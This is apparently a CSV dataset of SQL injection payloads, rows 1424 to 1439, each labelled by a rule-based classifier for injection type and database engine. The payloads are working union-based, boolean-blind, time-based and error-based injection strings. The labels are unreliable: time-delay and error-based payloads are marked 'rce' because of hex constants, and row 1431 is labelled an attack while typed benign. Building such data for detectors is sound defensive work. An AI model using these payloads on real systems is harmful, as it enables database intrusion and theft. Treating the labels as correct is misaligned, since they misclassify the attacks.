row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1424,"1"" where 2035 = 2035 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
1425,"-5891 union all select 7103,7103,7103,7103--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1426,"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'xgzb' = 'xgzb",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1427,"1' ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
1428,1' ) ) as mbzk where 9153 = 9153 and 2006 = 2006,1,,boolean_blind,generic,0.95,9153 = 9153 and detected — boolean_blind injection (priority 8) on generic,rule-based
1429,"1"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
1430,1'+ ( select 'hcqf' where 9956 = 9956 and ( 2993 = 4297 ) *4297 ) +',1,,boolean_blind,generic,0.95,9956 = 9956 and detected — boolean_blind injection (priority 8) on generic,rule-based
1431,1'|| ( select 'gved' from dual where 6965 = 6965,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1432,-8963 ) where 8528 = 8528 or ( 2470 = 3271 ) *3271--,1,,boolean_blind,generic,0.95,8528 = 8528 or detected — boolean_blind injection (priority 8) on generic,rule-based
1433,"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'scye' like 'scye",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
1434,"1"" ) ) as kmss where 3214 = 3214 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,,boolean_blind,generic,0.95,3214 = 3214 and detected — boolean_blind injection (priority 8) on generic,rule-based
1435,"1"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ""igop"" = ""igop",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1436,"1'+ ( select afst where 7454 = 7454 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
1437,"1 ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
1438,"1 where 5929 = 5929 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
1439,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
